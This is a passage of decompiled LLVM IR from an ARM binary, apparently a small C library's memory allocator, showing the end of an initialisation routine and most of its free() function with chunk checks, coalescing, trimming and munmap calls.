  %v2_26454 = add i32 %v1_26454, 44
  %v3_26454 = inttoptr i32 %v2_26454 to i32*
  store i32 %v0_26454, i32* %v3_26454, align 4
  br label %dec_label_pc_26458

dec_label_pc_26458:                               ; preds = %dec_label_pc_26424, %dec_label_pc_26448
  %v0_26458 = load i32, i32* %sl.global-to-local, align 4
  %v2_26458 = icmp eq i32 %v0_26458, 0
  store i32 %v0_26458, i32* %r1.global-to-local, align 4
  br i1 %v2_26458, label %dec_label_pc_26464.loopexit, label %dec_label_pc_26380

dec_label_pc_26464.loopexit:                      ; preds = %dec_label_pc_26458
  %v0_26464.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_26464.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_26464

dec_label_pc_26464:                               ; preds = %dec_label_pc_26464.loopexit, %dec_label_pc_26370
  %v1_26464 = phi i32 [ %v1_26464.pre, %dec_label_pc_26464.loopexit ], [ %v1_2646410, %dec_label_pc_26370 ]
  %v0_2646c = phi i32 [ %v0_26464.pre, %dec_label_pc_26464.loopexit ], [ %v1_2637c, %dec_label_pc_26370 ]
  %v9_26464 = icmp eq i32 %v0_2646c, %v1_26464
  br i1 %v9_26464, label %dec_label_pc_264dc, label %dec_label_pc_2646c

dec_label_pc_2646c:                               ; preds = %dec_label_pc_26464
  %v1_2646c = add i32 %v0_2646c, 4
  store i32 %v1_2646c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_26370

dec_label_pc_26474.dec_label_pc_26474_crit_edge:  ; preds = %dec_label_pc_26474.preheader, %dec_label_pc_26474.dec_label_pc_26474_crit_edge
  %v0_26474.pre = load i32, i32* @r4, align 4
  %v1_26474.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_26474 = mul i32 %v1_26474.pre, 8
  %v5_26474 = add i32 %v4_26474, %v0_26474.pre
  %v1_26478 = add i32 %v1_26474.pre, 1
  store i32 %v1_26478, i32* %r2.global-to-local, align 4
  %v1_2647c = add i32 %v5_26474, 44
  store i32 %v1_2647c, i32* %r3.global-to-local, align 4
  %v2_26484 = add i32 %v5_26474, 52
  %v3_26484 = inttoptr i32 %v2_26484 to i32*
  store i32 %v1_2647c, i32* %v3_26484, align 4
  %v0_26488 = load i32, i32* %r3.global-to-local, align 4
  %v2_26488 = add i32 %v0_26488, 12
  %v3_26488 = inttoptr i32 %v2_26488 to i32*
  store i32 %v0_26488, i32* %v3_26488, align 4
  %v7_2648c = icmp sgt i32 %v1_26478, 95
  br i1 %v7_2648c, label %dec_label_pc_26490, label %dec_label_pc_26474.dec_label_pc_26474_crit_edge

dec_label_pc_26490:                               ; preds = %dec_label_pc_26474.dec_label_pc_26474_crit_edge
  %v0_26490 = load i32, i32* @r4, align 4
  %v1_26490 = inttoptr i32 %v0_26490 to i32*
  %v2_26490 = load i32, i32* %v1_26490, align 4
  store i32 %v2_26490, i32* %r2.global-to-local, align 4
  %v1_26494 = add i32 %v0_26490, 864
  %v2_26494 = inttoptr i32 %v1_26494 to i32*
  %v3_26494 = load i32, i32* %v2_26494, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_2649c = urem i32 %v2_26490, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_264a4 = or i32 %v3_26494, 1
  store i32 %v1_264a4, i32* %r1.global-to-local, align 4
  %v1_264a8 = or i32 %v1_2649c, 72
  store i32 %v1_264a8, i32* %r2.global-to-local, align 4
  %v1_264ac = add i32 %v0_26490, 52
  store i32 %v1_264ac, i32* %ip.global-to-local, align 4
  %v2_264b0 = add i32 %v0_26490, 840
  %v3_264b0 = inttoptr i32 %v2_264b0 to i32*
  store i32 0, i32* %v3_264b0, align 4
  %v0_264b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_264b4 = add i32 %v0_264b4, 65536
  store i32 %v1_264b4, i32* %r3.global-to-local, align 4
  %v0_264b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_264b8 = load i32, i32* @r4, align 4
  %v2_264b8 = add i32 %v1_264b8, 836
  %v3_264b8 = inttoptr i32 %v2_264b8 to i32*
  store i32 %v0_264b8, i32* %v3_264b8, align 4
  %v0_264bc = load i32, i32* %r0.global-to-local, align 4
  %v1_264bc = load i32, i32* @r4, align 4
  %v2_264bc = add i32 %v1_264bc, 844
  %v3_264bc = inttoptr i32 %v2_264bc to i32*
  store i32 %v0_264bc, i32* %v3_264bc, align 4
  %v1_264c0 = load i32, i32* @r4, align 4
  %v2_264c0 = add i32 %v1_264c0, 852
  %v3_264c0 = inttoptr i32 %v2_264c0 to i32*
  store i32 %v1_264b4, i32* %v3_264c0, align 4
  %v1_264c4 = load i32, i32* @r4, align 4
  %v2_264c4 = add i32 %v1_264c4, 864
  %v3_264c4 = inttoptr i32 %v2_264c4 to i32*
  store i32 %v1_264a4, i32* %v3_264c4, align 4
  %v1_264c8 = load i32, i32* @r4, align 4
  %v2_264c8 = inttoptr i32 %v1_264c8 to i32*
  store i32 %v1_264a8, i32* %v2_264c8, align 4
  %v0_264cc = load i32, i32* %ip.global-to-local, align 4
  %v1_264cc = load i32, i32* @r4, align 4
  %v2_264cc = add i32 %v1_264cc, 44
  %v3_264cc = inttoptr i32 %v2_264cc to i32*
  store i32 %v0_264cc, i32* %v3_264cc, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_264d4 = call i32 @sysconf(i32 30, i32 %v1_264a4, i32 %v1_264a8, i32 %v1_264b4)
  store i32 %v4_264d4, i32* @r0, align 4
  %v1_264d8 = load i32, i32* @r4, align 4
  %v2_264d8 = add i32 %v1_264d8, 860
  %v3_264d8 = inttoptr i32 %v2_264d8 to i32*
  store i32 %v4_264d4, i32* %v3_264d8, align 4
  br label %dec_label_pc_264dc

dec_label_pc_264dc:                               ; preds = %dec_label_pc_26464, %dec_label_pc_26490
  %v2_264e0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_264e0, i32* @r4, align 4
  %v1_264e4 = load i32, i32* @r0, align 4
  ret i32 %v1_264e4

; uselistorder directives
  uselistorder i32 %v0_26490, { 1, 0, 2, 3 }
  uselistorder i32 %v0_26488, { 1, 0 }
  uselistorder i32 %v1_2646c, { 1, 0 }
  uselistorder i32 %v0_26458, { 0, 2, 1 }
  uselistorder i32 %v0_26434, { 1, 0 }
  uselistorder i32 %v1_26384, { 1, 0, 2 }
  uselistorder i32 %v0_2639c, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_2635c, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 19 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 3, 4, 5, 6, 7, 8, 9, 10, 2, 11, 12 }
  uselistorder i32* %lr.global-to-local, { 2, 0, 3, 5, 1, 4, 6 }
  uselistorder i32 30, { 0, 5, 1, 4, 2, 3 }
  uselistorder label %dec_label_pc_264dc, { 1, 0 }
  uselistorder label %dec_label_pc_26474.dec_label_pc_26474_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_26458, { 1, 0 }
  uselistorder label %dec_label_pc_26424, { 1, 0 }
  uselistorder label %dec_label_pc_26418, { 1, 0 }
  uselistorder label %dec_label_pc_26414, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_263d0, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_264e8 = load i32, i32* @r4, align 4
  %v6_264e8 = load i32, i32* @r5, align 4
  %v9_264e8 = load i32, i32* @r6, align 4
  %v12_264e8 = load i32, i32* @r7, align 4
  %v18_264e8 = load i32, i32* @lr, align 4
  %v0_264f0 = load i32, i32* @r0, align 4
  store i32 %v0_264f0, i32* @r6, align 4
  %v2_264f0 = icmp eq i32 %v0_264f0, 0
  %v2_264f4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @r7, align 4
  br i1 %v2_264f0, label %dec_label_pc_266fc, label %dec_label_pc_26500

dec_label_pc_26500:                               ; preds = %entry
  store i32 120, i32* %r3.global-to-local, align 4
  %v4_26504 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 120) to i32*), align 4
  store i32 %v4_26504, i32* %r4.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 %v4_26504, i32* %r2.global-to-local, align 4
  %v4_26510 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 76) to i32*), align 4
  store i32 %v4_26510, i32* %r1.global-to-local, align 4
  store i32 %v2_264f4, i32* %r0.global-to-local, align 4
  store i32 124, i32* %r3.global-to-local, align 4
  %v4_2651c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 124) to i32*), align 4
  store i32 %v4_2651c, i32* %ip.global-to-local, align 4
  store i32 156968, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_2651c)
  %v0_26528 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_26528, i32* %r0.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_26530 = load i32, i32* @r7, align 4
  %v2_26530 = add i32 %v0_26530, 20
  %v3_26530 = inttoptr i32 %v2_26530 to i32*
  %v4_26530 = load i32, i32* %v3_26530, align 4
  store i32 %v4_26530, i32* %ip.global-to-local, align 4
  store i32 156988, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_26530)
  store i32 72, i32* %r3.global-to-local, align 4
  %v0_26540 = load i32, i32* @r7, align 4
  %v2_26540 = add i32 %v0_26540, 72
  %v3_26540 = inttoptr i32 %v2_26540 to i32*
  %v4_26540 = load i32, i32* %v3_26540, align 4
  store i32 %v4_26540, i32* @lr, align 4
  %v0_26544 = load i32, i32* @r6, align 4
  %v1_26544 = add i32 %v0_26544, -4
  %v2_26544 = inttoptr i32 %v1_26544 to i32*
  %v3_26544 = load i32, i32* %v2_26544, align 4
  store i32 %v3_26544, i32* %r2.global-to-local, align 4
  %v1_26548 = inttoptr i32 %v4_26540 to i32*
  %v2_26548 = load i32, i32* %v1_26548, align 4
  store i32 %v2_26548, i32* %r3.global-to-local, align 4
  %v1_2654c = and i32 %v3_26544, -4
  store i32 %v1_2654c, i32* %ip.global-to-local, align 4
  %v1_26550 = add i32 %v0_26544, -8
  store i32 %v1_26550, i32* @r5, align 4
  store i32 %v1_26550, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_2654c, %v2_26548
  br i1 %tmp, label %dec_label_pc_26580, label %dec_label_pc_26560

dec_label_pc_26560:                               ; preds = %dec_label_pc_26500
  %v1_26560 = or i32 %v2_26548, 3
  store i32 %v1_26560, i32* %r3.global-to-local, align 4
  store i32 %v1_26560, i32* %v1_26548, align 4
  %v3_26564 = load i32, i32* @lr, align 4
  %v4_26564 = add i32 %v3_26564, -8
  store i32 %v4_26564, i32* %lr.global-to-local, align 4
  %v0_26568 = load i32, i32* %ip.global-to-local, align 4
  %v3_26568 = udiv i32 %v0_26568, 8
  store i32 %v3_26568, i32* %r1.global-to-local, align 4
  %v1_2656c = add i32 %v3_26564, -4
  store i32 %v1_2656c, i32* @r2, align 4
  %v4_26570 = mul nuw i32 %v3_26568, 4
  %v5_26570 = add i32 %v4_26570, %v1_2656c
  %v6_26570 = inttoptr i32 %v5_26570 to i32*
  %v7_26570 = load i32, i32* %v6_26570, align 4
  store i32 %v7_26570, i32* %r3.global-to-local, align 4
  %v1_26574 = load i32, i32* @r5, align 4
  %v2_26574 = add i32 %v1_26574, 8
  %v3_26574 = inttoptr i32 %v2_26574 to i32*
  store i32 %v7_26570, i32* %v3_26574, align 4
  %v0_26578 = load i32, i32* @r5, align 4
  %v1_26578 = load i32, i32* @r2, align 4
  %v2_26578 = load i32, i32* %r1.global-to-local, align 4
  %v5_26578 = mul i32 %v2_26578, 4
  %v6_26578 = add i32 %v5_26578, %v1_26578
  %v7_26578 = inttoptr i32 %v6_26578 to i32*
  store i32 %v0_26578, i32* %v7_26578, align 4
  br label %dec_label_pc_266e4

dec_label_pc_26580:                               ; preds = %dec_label_pc_26500
  %v1_26580 = and i32 %v3_26544, 2
  %v2_26580 = icmp eq i32 %v1_26580, 0
  br i1 %v2_26580, label %dec_label_pc_26588, label %dec_label_pc_266bc

dec_label_pc_26588:                               ; preds = %dec_label_pc_26580
  %v1_26588 = or i32 %v2_26548, 1
  store i32 %v1_26588, i32* %r3.global-to-local, align 4
  store i32 %v1_26588, i32* %v1_26548, align 4
  %v0_26590 = load i32, i32* @r6, align 4
  %v1_26590 = add i32 %v0_26590, -4
  %v2_26590 = inttoptr i32 %v1_26590 to i32*
  %v3_26590 = load i32, i32* %v2_26590, align 4
  store i32 %v3_26590, i32* %r3.global-to-local, align 4
  %v0_26594 = load i32, i32* @r5, align 4
  %v1_26594 = load i32, i32* %ip.global-to-local, align 4
  %v2_26594 = add i32 %v1_26594, %v0_26594
  store i32 %v2_26594, i32* %lr.global-to-local, align 4
  %v1_26598 = urem i32 %v3_26590, 2
  %v2_26598 = icmp eq i32 %v1_26598, 0
  %v1_2659c = add i32 %v2_26594, 4
  %v2_2659c = inttoptr i32 %v1_2659c to i32*
  %v3_2659c = load i32, i32* %v2_2659c, align 4
  store i32 %v3_2659c, i32* %r8.global-to-local, align 4
  br i1 %v2_26598, label %dec_label_pc_265a4, label %dec_label_pc_265d8

dec_label_pc_265a4:                               ; preds = %dec_label_pc_26588
  %v1_265a4 = add i32 %v0_26590, -8
  %v2_265a4 = inttoptr i32 %v1_265a4 to i32*
  %v3_265a4 = load i32, i32* %v2_265a4, align 4
  store i32 %v3_265a4, i32* %r1.global-to-local, align 4
  %v2_265a8 = sub i32 %v0_26594, %v3_265a4
  store i32 %v2_265a8, i32* %r3.global-to-local, align 4
  %v1_265ac = add i32 %v2_265a8, 8
  %v2_265ac = inttoptr i32 %v1_265ac to i32*
  %v3_265ac = load i32, i32* %v2_265ac, align 4
  store i32 %v3_265ac, i32* %r2.global-to-local, align 4
  %v1_265b0 = add i32 %v3_265ac, 12
  %v2_265b0 = inttoptr i32 %v1_265b0 to i32*
  %v3_265b0 = load i32, i32* %v2_265b0, align 4
  store i32 %v3_265b0, i32* %r4.global-to-local, align 4
  %v9_265b4 = icmp eq i32 %v3_265b0, %v2_265a8
  %v1_265b8 = add i32 %v2_265a8, 12
  %v2_265b8 = inttoptr i32 %v1_265b8 to i32*
  %v3_265b8 = load i32, i32* %v2_265b8, align 4
  store i32 %v3_265b8, i32* %r0.global-to-local, align 4
  br i1 %v9_265b4, label %dec_label_pc_265c0, label %dec_label_pc_26624

dec_label_pc_265c0:                               ; preds = %dec_label_pc_265a4
  %v1_265c0 = add i32 %v3_265b8, 8
  %v2_265c0 = inttoptr i32 %v1_265c0 to i32*
  %v3_265c0 = load i32, i32* %v2_265c0, align 4
  store i32 %v3_265c0, i32* %r3.global-to-local, align 4
  %v9_265c4 = icmp eq i32 %v3_265c0, %v2_265a8
  br i1 %v9_265c4, label %dec_label_pc_265cc, label %dec_label_pc_26624

dec_label_pc_265cc:                               ; preds = %dec_label_pc_265c0
  store i32 %v3_265ac, i32* %v2_265c0, align 4
  %v0_265d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_265d0 = load i32, i32* %r2.global-to-local, align 4
  %v2_265d0 = add i32 %v1_265d0, 12
  %v3_265d0 = inttoptr i32 %v2_265d0 to i32*
  store i32 %v0_265d0, i32* %v3_265d0, align 4
  %v0_265d4 = load i32, i32* %ip.global-to-local, align 4
  %v1_265d4 = load i32, i32* %r1.global-to-local, align 4
  %v2_265d4 = add i32 %v1_265d4, %v0_265d4
  store i32 %v2_265d4, i32* %ip.global-to-local, align 4
  %v0_265e4.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_265e8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_265d8

dec_label_pc_265d8:                               ; preds = %dec_label_pc_26588, %dec_label_pc_265cc
  %v0_26664 = phi i32 [ %v1_26594, %dec_label_pc_26588 ], [ %v2_265d4, %dec_label_pc_265cc ]
  %v0_265e8 = phi i32 [ %v3_2659c, %dec_label_pc_26588 ], [ %v0_265e8.pre, %dec_label_pc_265cc ]
  %v1_265fc = phi i32 [ %v2_26594, %dec_label_pc_26588 ], [ %v0_265e4.pre, %dec_label_pc_265cc ]
  store i32 72, i32* %r3.global-to-local, align 4
  %v0_265dc = load i32, i32* @r7, align 4
  %v2_265dc = add i32 %v0_265dc, 72
  %v3_265dc = inttoptr i32 %v2_265dc to i32*
  %v4_265dc = load i32, i32* %v3_265dc, align 4
  store i32 %v4_265dc, i32* @r2, align 4
  %v1_265e0 = add i32 %v4_265dc, 44
  %v2_265e0 = inttoptr i32 %v1_265e0 to i32*
  %v3_265e0 = load i32, i32* %v2_265e0, align 4
  store i32 %v3_265e0, i32* %r3.global-to-local, align 4
  %v9_265e4 = icmp eq i32 %v1_265fc, %v3_265e0
  %v1_265e8 = and i32 %v0_265e8, -4
  store i32 %v1_265e8, i32* %r0.global-to-local, align 4
  br i1 %v9_265e4, label %dec_label_pc_26664, label %dec_label_pc_265f0

dec_label_pc_265f0:                               ; preds = %dec_label_pc_265d8
  %v2_265f0 = add i32 %v1_265fc, %v1_265e8
  store i32 %v2_265f0, i32* %r3.global-to-local, align 4
  %v1_265f4 = add i32 %v2_265f0, 4
  %v2_265f4 = inttoptr i32 %v1_265f4 to i32*
  %v3_265f4 = load i32, i32* %v2_265f4, align 4
  store i32 %v3_265f4, i32* %r3.global-to-local, align 4
  %v1_265f8 = urem i32 %v3_265f4, 2
  %v2_265f8 = icmp eq i32 %v1_265f8, 0
  %v2_265fc = add i32 %v1_265fc, 4
  %v3_265fc = inttoptr i32 %v2_265fc to i32*
  store i32 %v1_265e8, i32* %v3_265fc, align 4
  br i1 %v2_265f8, label %dec_label_pc_26604, label %dec_label_pc_265f0.dec_label_pc_26634_crit_edge

dec_label_pc_265f0.dec_label_pc_26634_crit_edge:  ; preds = %dec_label_pc_265f0
  %v0_26644.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_26634

dec_label_pc_26604:                               ; preds = %dec_label_pc_265f0
  %v0_26604 = load i32, i32* %lr.global-to-local, align 4
  %v1_26604 = add i32 %v0_26604, 8
  %v2_26604 = inttoptr i32 %v1_26604 to i32*
  %v3_26604 = load i32, i32* %v2_26604, align 4
  store i32 %v3_26604, i32* %r1.global-to-local, align 4
  %v1_26608 = add i32 %v3_26604, 12
  %v2_26608 = inttoptr i32 %v1_26608 to i32*
  %v3_26608 = load i32, i32* %v2_26608, align 4
  store i32 %v3_26608, i32* %r3.global-to-local, align 4
  %v9_2660c = icmp eq i32 %v3_26608, %v0_26604
  %v1_26610 = add i32 %v0_26604, 12
  %v2_26610 = inttoptr i32 %v1_26610 to i32*
  %v3_26610 = load i32, i32* %v2_26610, align 4
  store i32 %v3_26610, i32* %r2.global-to-local, align 4
  br i1 %v9_2660c, label %dec_label_pc_26618, label %dec_label_pc_26624

dec_label_pc_26618:                               ; preds = %dec_label_pc_26604
  %v1_26618 = add i32 %v3_26610, 8
  %v2_26618 = inttoptr i32 %v1_26618 to i32*
  %v3_26618 = load i32, i32* %v2_26618, align 4
  store i32 %v3_26618, i32* %r3.global-to-local, align 4
  %v9_2661c = icmp eq i32 %v3_26618, %v0_26604
  br i1 %v9_2661c, label %dec_label_pc_26628, label %dec_label_pc_26624

dec_label_pc_26624:                               ; preds = %dec_label_pc_26604, %dec_label_pc_265c0, %dec_label_pc_265a4, %dec_label_pc_26618
  %v0_26624 = call i32 @abort()
  store i32 %v0_26624, i32* %r0.global-to-local, align 4
  %v0_26628.pre = load i32, i32* @r1, align 4
  %v1_26628.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_26628

dec_label_pc_26628:                               ; preds = %dec_label_pc_26618, %dec_label_pc_26624
  %v1_26628 = phi i32 [ %v3_26610, %dec_label_pc_26618 ], [ %v1_26628.pre, %dec_label_pc_26624 ]
  %v0_26628 = phi i32 [ %v3_26604, %dec_label_pc_26618 ], [ %v0_26628.pre, %dec_label_pc_26624 ]
  %v2_26628 = add i32 %v1_26628, 8
  %v3_26628 = inttoptr i32 %v2_26628 to i32*
  store i32 %v0_26628, i32* %v3_26628, align 4
  %v0_2662c = load i32, i32* %r2.global-to-local, align 4
  %v1_2662c = load i32, i32* %r1.global-to-local, align 4
  %v2_2662c = add i32 %v1_2662c, 12
  %v3_2662c = inttoptr i32 %v2_2662c to i32*
  store i32 %v0_2662c, i32* %v3_2662c, align 4
  %v0_26630 = load i32, i32* %ip.global-to-local, align 4
  %v1_26630 = load i32, i32* %r0.global-to-local, align 4
  %v2_26630 = add i32 %v1_26630, %v0_26630
  store i32 %v2_26630, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_26634

dec_label_pc_26634:                               ; preds = %dec_label_pc_265f0.dec_label_pc_26634_crit_edge, %dec_label_pc_26628
  %v0_26644 = phi i32 [ %v0_26644.pre, %dec_label_pc_265f0.dec_label_pc_26634_crit_edge ], [ %v2_26630, %dec_label_pc_26628 ]
  store i32 72, i32* %r3.global-to-local, align 4
  %v0_26638 = load i32, i32* @r7, align 4
  %v2_26638 = add i32 %v0_26638, 72
  %v3_26638 = inttoptr i32 %v2_26638 to i32*
  %v4_26638 = load i32, i32* %v3_26638, align 4
  %v1_2663c = add i32 %v4_26638, 52
  store i32 %v1_2663c, i32* %r3.global-to-local, align 4
  %v1_26640 = add i32 %v4_26638, 60
  %v2_26640 = inttoptr i32 %v1_26640 to i32*
  %v3_26640 = load i32, i32* %v2_26640, align 4
  store i32 %v3_26640, i32* %r1.global-to-local, align 4
  %v1_26644 = or i32 %v0_26644, 1
  store i32 %v1_26644, i32* @r2, align 4
  %v1_26648 = load i32, i32* %r4.global-to-local, align 4
  %v2_26648 = add i32 %v1_26648, 12
  %v3_26648 = inttoptr i32 %v2_26648 to i32*
  store i32 %v1_2663c, i32* %v3_26648, align 4
  %v0_2664c = load i32, i32* %r1.global-to-local, align 4
  %v1_2664c = load i32, i32* %r4.global-to-local, align 4
  %v2_2664c = add i32 %v1_2664c, 8
  %v3_2664c = inttoptr i32 %v2_2664c to i32*
  store i32 %v0_2664c, i32* %v3_2664c, align 4
  %v0_26650 = load i32, i32* @r2, align 4
  %v1_26650 = load i32, i32* %r4.global-to-local, align 4
  %v2_26650 = add i32 %v1_26650, 4
  %v3_26650 = inttoptr i32 %v2_26650 to i32*
  store i32 %v0_26650, i32* %v3_26650, align 4
  %v0_26654 = load i32, i32* %ip.global-to-local, align 4
  %v1_26654 = load i32, i32* %r4.global-to-local, align 4
  %v3_26654 = add i32 %v1_26654, %v0_26654
  %v4_26654 = inttoptr i32 %v3_26654 to i32*
  store i32 %v0_26654, i32* %v4_26654, align 4
  %v0_26658 = load i32, i32* %r4.global-to-local, align 4
  %v1_26658 = load i32, i32* %r1.global-to-local, align 4
  %v2_26658 = add i32 %v1_26658, 12
  %v3_26658 = inttoptr i32 %v2_26658 to i32*
  store i32 %v0_26658, i32* %v3_26658, align 4
  %v0_2665c = load i32, i32* %r4.global-to-local, align 4
  %v1_2665c = load i32, i32* %r3.global-to-local, align 4
  %v2_2665c = add i32 %v1_2665c, 8
  %v3_2665c = inttoptr i32 %v2_2665c to i32*
  store i32 %v0_2665c, i32* %v3_2665c, align 4
  br label %dec_label_pc_26674

dec_label_pc_26664:                               ; preds = %dec_label_pc_265d8
  %v2_26664 = add i32 %v1_265e8, %v0_26664
  store i32 %v2_26664, i32* %ip.global-to-local, align 4
  %v1_26668 = or i32 %v2_26664, 1
  store i32 %v1_26668, i32* %r3.global-to-local, align 4
  %v0_2666c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_2666c, i32* %v2_265e0, align 4
  %v0_26670 = load i32, i32* %r3.global-to-local, align 4
  %v1_26670 = load i32, i32* %r4.global-to-local, align 4
  %v2_26670 = add i32 %v1_26670, 4
  %v3_26670 = inttoptr i32 %v2_26670 to i32*
  store i32 %v0_26670, i32* %v3_26670, align 4
  br label %dec_label_pc_26674

dec_label_pc_26674:                               ; preds = %dec_label_pc_26634, %dec_label_pc_26664
  %v0_26674 = load i32, i32* %ip.global-to-local, align 4
  %v3_26678 = icmp ult i32 %v0_26674, 131070
  br i1 %v3_26678, label %dec_label_pc_266e4, label %dec_label_pc_2667c

dec_label_pc_2667c:                               ; preds = %dec_label_pc_26674
  store i32 72, i32* %r3.global-to-local, align 4
  %v0_26680 = load i32, i32* @r7, align 4
  %v2_26680 = add i32 %v0_26680, 72
  %v3_26680 = inttoptr i32 %v2_26680 to i32*
  %v4_26680 = load i32, i32* %v3_26680, align 4
  store i32 %v4_26680, i32* @r4, align 4
  %v1_26684 = inttoptr i32 %v4_26680 to i32*
  %v2_26684 = load i32, i32* %v1_26684, align 4
  store i32 %v2_26684, i32* %r3.global-to-local, align 4
  %v1_26688 = and i32 %v2_26684, 2
  %v2_26688 = icmp eq i32 %v1_26688, 0
  br i1 %v2_26688, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_2667c
  store i32 %v4_26680, i32* %r0.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_2667c, %bb
  %v1_26690 = xor i1 %v2_26688, true
  call void @__pseudo_cond_branch(i1 %v1_26690, i32 ptrtoint (i32* @global_var_26334.3196 to i32))
  %v0_26694 = load i32, i32* @r4, align 4
  %v1_26694 = add i32 %v0_26694, 44
  %v2_26694 = inttoptr i32 %v1_26694 to i32*
  %v3_26694 = load i32, i32* %v2_26694, align 4
  store i32 %v3_26694, i32* %r3.global-to-local, align 4
  %v1_26698 = add i32 %v3_26694, 4
  %v2_26698 = inttoptr i32 %v1_26698 to i32*
  %v3_26698 = load i32, i32* %v2_26698, align 4
  store i32 %v3_26698, i32* %r3.global-to-local, align 4
  %v1_2669c = add i32 %v0_26694, 836
  %v2_2669c = inttoptr i32 %v1_2669c to i32*
  %v3_2669c = load i32, i32* %v2_2669c, align 4
  store i32 %v3_2669c, i32* @r2, align 4
  %v1_266a0 = and i32 %v3_26698, -4
  store i32 %v1_266a0, i32* %r3.global-to-local, align 4
  %v3_266a4 = icmp ult i32 %v1_266a0, %v3_2669c
  br i1 %v3_266a4, label %dec_label_pc_266e4, label %dec_label_pc_266ac

dec_label_pc_266ac:                               ; preds = %bb16
  store i32 %v0_26694, i32* %r1.global-to-local, align 4
  %v1_266b0 = add i32 %v0_26694, 840
  %v2_266b0 = inttoptr i32 %v1_266b0 to i32*
  %v3_266b0 = load i32, i32* %v2_266b0, align 4
  store i32 %v3_266b0, i32* %r0.global-to-local, align 4
  %v2_266b4 = call i32 @__malloc_trim(i32 %v3_266b0, i32 %v0_26694)
  store i32 %v2_266b4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_266e4

dec_label_pc_266bc:                               ; preds = %dec_label_pc_26580
  %v2_266bc = inttoptr i32 %v1_26550 to i32*
  %v3_266bc = load i32, i32* %v2_266bc, align 4
  store i32 %v3_266bc, i32* %r0.global-to-local, align 4
  %v1_266c0 = add i32 %v4_26540, 848
  %v2_266c0 = inttoptr i32 %v1_266c0 to i32*
  %v3_266c0 = load i32, i32* %v2_266c0, align 4
  store i32 %v3_266c0, i32* %r2.global-to-local, align 4
  %v1_266c4 = add i32 %v4_26540, 868
  %v2_266c4 = inttoptr i32 %v1_266c4 to i32*
  %v3_266c4 = load i32, i32* %v2_266c4, align 4
  %v2_266c8 = add i32 %v3_266bc, %v1_2654c
  store i32 %v2_266c8, i32* %r1.global-to-local, align 4
  %v1_266cc = add i32 %v3_266c0, -1
  store i32 %v1_266cc, i32* %r2.global-to-local, align 4
  %v2_266d0 = sub i32 %v3_266c4, %v2_266c8
  store i32 %v2_266d0, i32* %r3.global-to-local, align 4
  store i32 %v2_266d0, i32* %v2_266c4, align 4
  %v1_266d8 = load i32, i32* @lr, align 4
  %v2_266d8 = add i32 %v1_266d8, 848
  %v3_266d8 = inttoptr i32 %v2_266d8 to i32*
  store i32 %v1_266cc, i32* %v3_266d8, align 4
  %v0_266dc = load i32, i32* %r0.global-to-local, align 4
  %v1_266dc = load i32, i32* @r5, align 4
  %v2_266dc = sub i32 %v1_266dc, %v0_266dc
  store i32 %v2_266dc, i32* %r0.global-to-local, align 4
  %v4_266e0 = call i32 @munmap(i32 %v2_266dc, i32 %v2_266c8, i32 %v1_266cc, i32 %v2_266d0)
  store i32 %v4_266e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_266e4

dec_label_pc_266e4:                               ; preds = %bb16, %dec_label_pc_26674, %dec_label_pc_266ac, %dec_label_pc_26560, %dec_label_pc_266bc
  store i32 %v2_264f4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 52, i32* @r3, align 4
  %v0_266f0 = load i32, i32* @r7, align 4
  %v2_266f0 = add i32 %v0_266f0, 52
  %v3_266f0 = inttoptr i32 %v2_266f0 to i32*
  %v4_266f0 = load i32, i32* %v3_266f0, align 4
  store i32 %v4_266f0, i32* @ip, align 4
  store i32 157436, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_266f0)
